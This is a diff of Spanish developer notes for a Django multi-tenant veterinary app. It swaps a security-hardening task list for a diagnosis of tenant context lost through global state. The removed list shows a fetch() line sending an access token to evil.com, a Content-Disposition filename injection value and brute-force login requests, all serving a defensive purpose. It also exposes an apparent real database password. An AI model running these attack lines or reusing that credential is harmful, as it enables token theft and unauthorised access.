@@ -1,466 +1,86 @@
-Detalle completo de todas las tareas
-
-  ---
-  T1 — SECRET_KEY + variables de producción
-
-  El problema:
-  Tu SECRET_KEY actual empieza con django-insecure-. Django usa esta clave para firmar todas las cookies de sesión,
-  tokens CSRF y cualquier dato serializado con signing.dumps(). Si alguien la conoce, puede forjar tokens. La clave de
-  dev vive en .env (que nunca se sube), pero en producción necesitas una diferente y fuerte.
-
-  La solución:
-  No se toca el .env local. En el servidor de producción, seteas las variables directamente en la plataforma (Railway →
-  Variables, Render → Environment, VPS → /etc/environment o systemd unit). Tu settings.py ya usa decouple.config() así
-  que lee de entorno sin cambios.
-
-  Qué hacer:
-  # 1. Genera la clave (solo para copiarla al panel de producción)
-  python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"
-
-  # Output ejemplo:
-  # w$k7@2xp!mn#q8...  (50 chars aleatorios)
-
-  # 2. Variables que necesitas setear en producción:
-  SECRET_KEY=<la clave generada arriba>
-  DEBUG=False
-  ALLOWED_HOSTS=tudominio.com,www.tudominio.com
-  DB_NAME=veterinaria_prod
-  DB_USER=postgres_prod
-  DB_PASSWORD=<contraseña nueva, diferente a Caimanes23>
-  DB_HOST=<host del servidor de BD>
-  DB_PORT=5432
-
-  También hay que actualizar .env.example para documentar que ALLOWED_HOSTS y CORS_ALLOWED_ORIGINS son obligatorios en
-  producción — actualmente no aparecen en el ejemplo.
-
-  ---
-  T2 — Eliminar /api/employees/ legacy
-
-  El problema:
-  CreateEmployeeView crea el serializer sin pasar context={'request': request}:
-
-  # views.py:38 — el bug
-  def post(self, request):
-      serializer = CreateEmployeeSerializer(data=request.data)  # sin context
-      # → request.context.get('request') devuelve None
-      # → organization = None
-      # → usuario creado sin organización
-
-  Un usuario sin organización es un estado incoherente: el TenantManager le devuelve querysets vacíos pero el usuario
-  existe en la DB fuera de cualquier tenant. Si ese usuario logra un JWT válido, su comportamiento es impredecible.
-
-  La solución:
-  Simplemente remover la ruta. El endpoint correcto ya existe y funciona bien:
-
-  # config/urls.py — ANTES
-  path('api/employees/', CreateEmployeeView.as_view()),  # ← eliminar esta línea
-  path('api/staff/', StaffListView.as_view(), name='staff-list'),
-  path('api/staff/create/', StaffCreateView.as_view(), name='staff-create'),
-
-  # config/urls.py — DESPUÉS
-  # (sin la línea de /api/employees/)
-  path('api/staff/', StaffListView.as_view(), name='staff-list'),
-  path('api/staff/create/', StaffCreateView.as_view(), name='staff-create'),
-
-  También se puede eliminar CreateEmployeeView de views.py y su import en urls.py.
-
-  ---
-  T3 — Rate limiting en login
-
-  El problema:
-  /api/token/ no tiene ningún límite de intentos. Un atacante puede automatizar miles de combinaciones por segundo:
-  POST /api/token/ {"username": "admin", "password": "123456"}
-  POST /api/token/ {"username": "admin", "password": "password"}
-  POST /api/token/ {"username": "admin", "password": "Caimanes23"}
-  ...
-  Django REST Framework incluye throttling nativo, solo hay que activarlo.
-
-  La solución:
-
-  # settings.py — agregar dentro de REST_FRAMEWORK
-  REST_FRAMEWORK = {
-      'DEFAULT_AUTHENTICATION_CLASSES': (
-          'apps.core.authentication.TenantJWTAuthentication',
-      ),
-      # AGREGAR:
-      'DEFAULT_THROTTLE_CLASSES': [
-          'rest_framework.throttling.AnonRateThrottle',
-          'rest_framework.throttling.UserRateThrottle',
-      ],
-      'DEFAULT_THROTTLE_RATES': {
-          'anon': '10/min',   # 10 intentos/min para no autenticados
-          'user': '60/min',   # 60 requests/min para autenticados
-          'login': '5/min',   # throttle específico para el login
-      },
-  }
-
-  # apps/users/throttles.py — archivo nuevo (5 líneas)
-  from rest_framework.throttling import AnonRateThrottle
-
-  class LoginRateThrottle(AnonRateThrottle):
-      scope = 'login'
+Error identificado:
 
-  # config/urls.py — aplicar throttle al endpoint de token
-  from rest_framework_simplejwt.views import TokenObtainPairView
-  from apps.users.throttles import LoginRateThrottle
-  from rest_framework.decorators import throttle_classes
+El sistema reportaba que el usuario autenticado no tenía organización (organization = None), lo cual provocaba errores en endpoints como el dashboard.
 
-  # Crear vista custom con throttle
-  class ThrottledTokenObtainPairView(TokenObtainPairView):
-      throttle_classes = [LoginRateThrottle]
+Después de realizar pruebas y agregar logs en el backend, se confirmó que:
 
-  # En urlpatterns reemplazar:
-  path('api/token/', ThrottledTokenObtainPairView.as_view()),
+El usuario existe correctamente en la base de datos.
+El campo organization_id está asignado (por ejemplo: 2).
+La relación user.organization se carga correctamente desde Django ORM.
+La autenticación con JWT funciona correctamente.
 
-  Con esto, después de 5 intentos fallidos en 1 minuto la IP recibe HTTP 429 Too Many Requests.
+Esto descarta problemas de:
 
-  ---
-  T4 — Corregir permiso implícito cuando required=None
+Base de datos
+Migraciones
+JWT o autenticación
+Infraestructura (Railway / deploy)
 
-  El problema:
-  Si una vista no define resource_name, basename ni required_permission, el sistema de permisos permite el acceso en
-  silencio:
+Causa raíz del problema:
 
-  # permissions.py:122-123
-  if required is None:
-      return True  # ← cualquier usuario autenticado entra
+El error no está en la obtención del usuario ni en la base de datos, sino en la forma en que la aplicación maneja el contexto de la organización después de la autenticación.
 
-  El comentario dice "comportamiento conservador durante la migración" — eso fue válido durante el desarrollo, pero en
-  producción es un fallo abierto. Si en el futuro alguien agrega una vista y olvida definir el recurso, automáticamente
-  es accesible para todos.
+El sistema utiliza un mecanismo de estado global (por ejemplo, set_current_org / get_current_org) para almacenar la organización del usuario. Este enfoque depende de variables globales o thread-local.
 
-  La solución:
-  Cambiar a return False y auditar que ninguna vista activa tenga required=None:
+En entornos de producción, esto no es confiable porque:
 
-  # permissions.py — ANTES
-  if required is None:
-      return True
+Cada request puede ser atendida por distintos workers (por ejemplo, en Gunicorn).
+El estado global no se comparte de forma segura entre requests concurrentes.
+Puede perderse el contexto entre diferentes partes del flujo de ejecución.
+No es compatible con ejecución asíncrona o paralela.
 
-  # permissions.py — DESPUÉS
-  if required is None:
-      logger.error(
-          "Vista sin resource_name/required_permission: %s %s — acceso DENEGADO",
-          request.method, request.path,
-      )
-      return False
+Como resultado, aunque el usuario sí tiene organización en la base de datos, en algún punto del flujo esa información se pierde y termina evaluándose como None.
 
-  Antes de hacer este cambio, hay que verificar que todas las vistas activas tienen su recurso definido. Las vistas que
-  usan make_permission("codigo") ya están cubiertas. Las vistas con ModelViewSet y basename también. Hay que revisar
-  especialmente cualquier APIView custom sin resource_name.
-
-  ---
-  T5 — Sanitizar Content-Disposition del PDF
-
-  El problema:
-  El header HTTP se construye con datos de usuario sin escapar:
-
-  # prescriptions/views.py:181
-  response['Content-Disposition'] = (
-      f'attachment; filename="receta_{prescription.id}_{pet.name}.pdf"'
-  )
+Conclusión:
 
-  Si pet.name = 'Firulais"; filename="virus.exe', el header resultante es:
-  Content-Disposition: attachment; filename="receta_42_Firulais"; filename="virus.exe"
-  Algunos browsers y proxies interpretan el segundo filename= como el real. En casos más extremos con \r\n se pueden
-  inyectar headers adicionales completos.
-
-  La solución:
+Sí existe un error, pero es un error de arquitectura y manejo de estado, no de datos ni de autenticación.
 
-  # prescriptions/views.py — reemplazar las líneas 181-183
-  import re
+Recomendación (y por qué):
 
-  safe_name = re.sub(r'[^\w\s\-]', '', pet.name)[:50]  # solo alfanumérico, guion, espacio
-  response['Content-Disposition'] = (
-      f'attachment; filename="receta_{prescription.id}_{safe_name}.pdf"'
-  )
+No depender de variables globales para obtener la organización. En su lugar, siempre acceder directamente desde el request:
 
-  Alternativamente, RFC 5987 permite encoding explícito:
-  from urllib.parse import quote
-  encoded = quote(pet.name, safe='')
-  response['Content-Disposition'] = (
-      f"attachment; filename*=UTF-8''{encoded}.pdf"
-  )
-
-  ---
-  T6 — RBAC en dashboard_stats
-
-  El problema:
-  El endpoint más rico en información de la app tiene la protección más débil:
-
-  # dashboard/views.py:8
-  @permission_classes([IsAuthenticated])  # cualquier rol entra
-  def dashboard_stats(request):
-      # Devuelve: citas de hoy, 5 últimos historiales clínicos con diagnósticos,
-      # productos con stock bajo, estadísticas generales
-
-  Un ASSISTANT puede ver diagnósticos médicos completos del historial reciente aunque no tenga permiso de
-  medicalrecord.retrieve.
-
-  La solución:
-
-  # dashboard/views.py
-  from apps.core.permissions import make_permission
-
-  @api_view(['GET'])
-  @permission_classes([make_permission("dashboard.view")])  # o reutilizar "appointment.list"
-  def dashboard_stats(request):
-      ...
-
-  Si no se quiere crear un nuevo código de permiso, la opción más simple es reutilizar
-  make_permission("appointment.list") ya que todos los roles que deben ver el dashboard tienen ese permiso. Si se crea
-  dashboard.view, hay que agregarlo a PERMISSION_CODES y al dict PERMISSIONS para todos los roles relevantes.
-
-  ---
-  T7 — Headers de seguridad HTTP
-
-  El problema:
-  Sin estos headers, el browser no aplica protecciones adicionales. Con DEBUG=False en producción, Django los ignora si
-  no están configurados.
-
-  La solución — agregar al final de settings.py:
-
-  # settings.py — solo activo cuando DEBUG=False (producción)
-  if not DEBUG:
-      # Fuerza HTTPS — redirige HTTP → HTTPS
-      SECURE_SSL_REDIRECT = True
-
-      # HSTS: le dice al browser que SIEMPRE use HTTPS para este dominio
-      # 1 año (31536000 segundos). Empezar con 3600 y subir gradualmente
-      SECURE_HSTS_SECONDS = 3600
-      SECURE_HSTS_INCLUDE_SUBDOMAINS = True
-
-      # Cookies solo por HTTPS
-      SESSION_COOKIE_SECURE = True
-      CSRF_COOKIE_SECURE = True
-
-      # Evita que browsers "adivinen" el content-type
-      SECURE_CONTENT_TYPE_NOSNIFF = True
-
-      # No permite que la app se cargue en un iframe (clickjacking)
-      X_FRAME_OPTIONS = 'DENY'
-
-  CORS en producción — actualmente solo tiene localhost:
-  # settings.py — reemplazar la sección CORS
-  if DEBUG:
-      CORS_ALLOWED_ORIGINS = [
-          'http://localhost:5173',
-          'http://127.0.0.1:5173',
-      ]
-  else:
-      CORS_ALLOWED_ORIGINS = config(
-          'CORS_ALLOWED_ORIGINS',
-          cast=lambda v: [s.strip() for s in v.split(',')]
-      )
-
-  Así en producción seteas CORS_ALLOWED_ORIGINS=https://tudominio.com como variable de entorno.
-
-  ---
-  T8 — Migrar JWT de localStorage a cookies httpOnly
-
-  El problema:
-  localStorage es legible por cualquier JavaScript. Si hay un XSS en cualquier campo de texto libre (nombre de mascota,
-  diagnóstico, notas de prescripción), el atacante ejecuta:
-
-  fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token'))
-  // → roba el token y el refresh (7 días de acceso)
-
-  Las cookies httpOnly no son accesibles por JavaScript — solo el browser las envía automáticamente con cada request.
-
-  La solución requiere cambios en ambos lados:
-
-  Backend:
-  # apps/users/views.py — nueva vista de login que devuelve cookies
-  from rest_framework_simplejwt.views import TokenObtainPairView
-  from django.middleware.csrf import get_token
-
-  class CookieTokenObtainPairView(TokenObtainPairView):
-      def post(self, request, *args, **kwargs):
-          response = super().post(request, *args, **kwargs)
-          if response.status_code == 200:
-              access = response.data.pop('access')
-              refresh = response.data.pop('refresh')
-              # Setear cookies httpOnly
-              response.set_cookie(
-                  'access_token', access,
-                  httponly=True, secure=not settings.DEBUG,
-                  samesite='Lax', max_age=60*30  # 30 min
-              )
-              response.set_cookie(
-                  'refresh_token', refresh,
-                  httponly=True, secure=not settings.DEBUG,
-                  samesite='Lax', max_age=60*60*24*7  # 7 días
-              )
-          return response
-
-  # TenantJWTAuthentication — leer token de cookie además de header
-  class TenantJWTAuthentication(JWTAuthentication):
-      def authenticate(self, request):
-          # Primero intenta header Authorization (compatibilidad)
-          header = self.get_header(request)
-          if header is None:
-              # Fallback: cookie httpOnly
-              raw_token = request.COOKIES.get('access_token')
-              if raw_token is None:
-                  return None
-              validated_token = self.get_validated_token(raw_token)
-              user = self.get_user(validated_token)
-              set_current_user(user)
-              set_current_org(getattr(user, 'organization', None))
-              return (user, validated_token)
-          return super().authenticate(request)
-
-  Frontend:
-  // api/client.js — eliminar todo lo relacionado a localStorage para tokens
-  // axios envía las cookies automáticamente con withCredentials: true
-  const api = axios.create({
-      baseURL: import.meta.env.VITE_API_URL,
-      withCredentials: true,  // ← envía cookies en cada request
-  });
-
-  // Ya no necesita el interceptor de request para añadir Authorization header
-  // El interceptor de respuesta para logout sigue igual
-
-  // auth/authContext.jsx — eliminar localStorage para tokens
-  const login = () => {
-      // Ya no recibe tokens — la cookie la seteó el backend
-      // Solo actualizar el estado de React
-      setToken(true);  // flag de "hay sesión activa"
-  };
-
-  Nota: Este es el cambio más grande y requiere también ajustar CSRF para que funcione con cookies. Se hace después de
-  T9.
-
-  ---
-  T9 — Refresh automático de token en el frontend
-
-  El problema:
-  refreshTokenRequest() existe en login.js pero nunca se llama. Cuando el access token expira (30 min), el interceptor
-  actual simplemente borra todo y redirige al login:
-
-  // client.js:18-23 — comportamiento actual
-  if (error.response?.status === 401) {
-      localStorage.removeItem("access_token");
-      localStorage.removeItem("refresh_token");
-      localStorage.removeItem("user");
-      window.location.href = "/login";  // ← cierra sesión inmediatamente
-  }
-
-  El usuario pierde lo que estaba haciendo cada 30 minutos.
-
-  La solución:
-
-  // api/client.js — interceptor mejorado
-  import { refreshTokenRequest } from '../auth/login';
-
-  let isRefreshing = false;
-  let failedQueue = [];  // requests que fallaron mientras se refrescaba
-
-  const processQueue = (error, token = null) => {
-      failedQueue.forEach(prom => {
-          if (error) prom.reject(error);
-          else prom.resolve(token);
-      });
-      failedQueue = [];
-  };
-
-  api.interceptors.response.use(
-      (response) => response,
-      async (error) => {
-          const originalRequest = error.config;
-
-          if (error.response?.status === 401 && !originalRequest._retry) {
-              if (isRefreshing) {
-                  // Encolar requests que llegan mientras se refresca
-                  return new Promise((resolve, reject) => {
-                      failedQueue.push({ resolve, reject });
-                  }).then(token => {
-                      originalRequest.headers.Authorization = `Bearer ${token}`;
-                      return api(originalRequest);
-                  });
-              }
-
-              originalRequest._retry = true;
-              isRefreshing = true;
-
-              const refreshToken = localStorage.getItem('refresh_token');
-
-              try {
-                  const { access } = await refreshTokenRequest(refreshToken);
-                  localStorage.setItem('access_token', access);
-                  api.defaults.headers.common['Authorization'] = `Bearer ${access}`;
-                  processQueue(null, access);
-                  originalRequest.headers.Authorization = `Bearer ${access}`;
-                  return api(originalRequest);
-              } catch (refreshError) {
-                  // Refresh falló (token expirado o inválido) → logout real
-                  processQueue(refreshError, null);
-                  localStorage.clear();
-                  window.location.href = '/login';
-                  return Promise.reject(refreshError);
-              } finally {
-                  isRefreshing = false;
-              }
-          }
-
-          if (error.response?.status >= 500) {
-              alert("Error del servidor. Intenta más tarde.");
-          }
-
-          return Promise.reject(error);
-      }
-  );
-
-  La cola (failedQueue) evita que si 3 requests fallan simultáneamente al expirar el token, se hagan 3 refreshes — solo
-  se hace 1 y los otros 2 esperan.
-
-  ---
-  T10 — PrivateRoute valida token + user
-
-  El problema:
-  La guarda de rutas privadas solo chequea user (que viene de localStorage):
-
-  // privateRoutes.jsx:6-8
-  if (!initializing && !user) {
-      return <Navigate to="/login" replace />;
-  }
-
-  Si alguien borra el access_token de localStorage pero deja el objeto user, la guarda lo deja pasar. Los requests al
-  backend fallarán porque no hay token, pero el usuario ve la UI con datos potencialmente cacheados en el estado de
-  React.
-
-  La solución:
-
-  // privateRoutes.jsx
-  const PrivateRoute = ({ children }) => {
-      const { token, user, initializing } = useAuth();
-
-      if (initializing) return null;  // esperar hidratación
-
-      if (!user || !token) {
-          return <Navigate to="/login" replace />;
-      }
-
-      return children;
-  };
-
-  Pequeño pero importante: también hay que manejar el estado initializing explícitamente para no flashear el login
-  mientras se carga localStorage.
-
-  ---
-  Resumen visual
-
-  FASE 1 — Fixes inmediatos (cada uno < 10 líneas)
-  ├── T2: Borrar /api/employees/          → config/urls.py
-  ├── T5: Sanitizar PDF filename          → prescriptions/views.py
-  ├── T6: RBAC en dashboard               → dashboard/views.py
-  └── T10: PrivateRoute valida token      → privateRoutes.jsx
-
-  FASE 2 — Configuración (settings y permisos)
-  ├── T1: SECRET_KEY prod + .env.example  → settings.py + .env.example
-  ├── T3: Rate limiting login             → settings.py + throttles.py nuevo
-  ├── T4: required=None → denegar         → core/permissions.py
-  └── T7: Headers HTTP producción         → settings.py
-
-  FASE 3 — Auth (mayor impacto)
-  ├── T9: Refresh automático de token     → api/client.js
-  └── T8: JWT → cookies httpOnly          → back + front (requiere T9 primero)
+org = request.user.organization
+
+Esto es recomendable porque:
+
+request.user proviene directamente del contexto de la request actual, no de un estado compartido.
+Garantiza que siempre estás usando el usuario real autenticado en esa petición.
+Evita inconsistencias entre requests concurrentes.
+Funciona correctamente con múltiples workers, procesos y entornos productivos.
+Es el patrón estándar en Django y en sistemas SaaS multitenant.
+
+Regla clave:
+
+En un SaaS multitenant, el tenant (organización) siempre debe derivarse del request, nunca de estado global.
+
+
+//DIAGNOSTICO
+El diagnóstico es correcto y la solución también. Es un error clásico que aparece exactamente en este momento: cuando el sistema pasa de desarrollo local con un solo proceso a producción con múltiples workers.
+
+Por qué ocurre exactamente
+En desarrollo local Django corre con un solo proceso y un solo thread. Si alguien usó threading.local() o una variable de módulo para guardar la organización del usuario actual, funciona perfectamente en local porque nunca hay dos requests compitiendo por ese espacio de memoria.
+En producción con Gunicorn hay varios workers corriendo en paralelo. Cada worker es un proceso independiente, pero dentro de cada worker pueden atenderse requests de distintos usuarios en secuencia. Si el estado global no se limpia correctamente entre requests, el worker que atendió a la clínica A puede tener esa organización en memoria cuando llega la request de la clínica B. El resultado es que la clínica B ve datos de la clínica A, o más comúnmente, ve None si el estado se limpió a destiempo.
+
+La solución es la correcta
+request.user.organization es el patrón estándar y no tiene ese problema porque el objeto request es creado nuevo para cada petición HTTP. No se comparte entre workers ni entre usuarios. Es el único lugar donde puedes confiar en que la información es del usuario correcto en ese momento exacto.
+
+Lo que hay que hacer ahora
+Buscar en todo el codebase cualquier uso de get_current_org(), set_current_org(), _current_org, o cualquier patrón de threading.local() relacionado con la organización. Cada uno de esos usos debe reemplazarse por request.user.organization pasado explícitamente como parámetro a los servicios que lo necesiten.
+El patrón correcto en los servicios es este:
+python# MAL — depende de estado global
+def get_invoices():
+    org = get_current_org()
+    return Invoice.objects.filter(organization=org)
+
+# BIEN — la organización viene del request
+def get_invoices(organization):
+    return Invoice.objects.filter(organization=organization)
+Y en la vista:
+pythondef list(self, request):
+    invoices = get_invoices(organization=request.user.organization)
+
+Una advertencia adicional
+Si el sistema usa Celery o cualquier tarea en background, ese contexto de request.user no existe porque no hay request. En esos casos la organización debe pasarse explícitamente como argumento a la tarea, nunca inferirse de estado global. Ese es el siguiente punto donde este mismo patrón puede reaparecer si no se atiende.
+
+En resumen
+El diagnóstico es preciso, la causa está bien identificada y la solución es la correcta. No es un problema grave en términos de datos porque no corrompió nada, pero sí era un problema de confiabilidad que en producción con múltiples clínicas podría haber causado fugas de datos entre organizaciones. Bien que se detectó antes de tener usuarios reales.
